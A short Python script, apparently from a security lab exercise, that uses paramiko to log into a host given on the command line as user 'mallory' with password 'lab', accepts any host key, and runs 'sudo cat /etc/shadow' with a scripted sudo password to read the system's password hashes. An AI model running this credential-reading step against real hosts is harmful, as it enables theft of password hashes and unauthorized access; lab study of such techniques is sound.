import paramiko
import sys

nbytes = 4096
port = 22
username = 'mallory'

def usage():
    print("Usage: " + sys.argv[0] + " [remote_host]")
    sys.exit()

if len(sys.argv) > 1:
    hostname = sys.argv[1]
else:
    usage()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname, username='mallory', password='lab')
stdin, stdout, stderr = ssh.exec_command("sudo cat /etc/shadow\ntest\n")
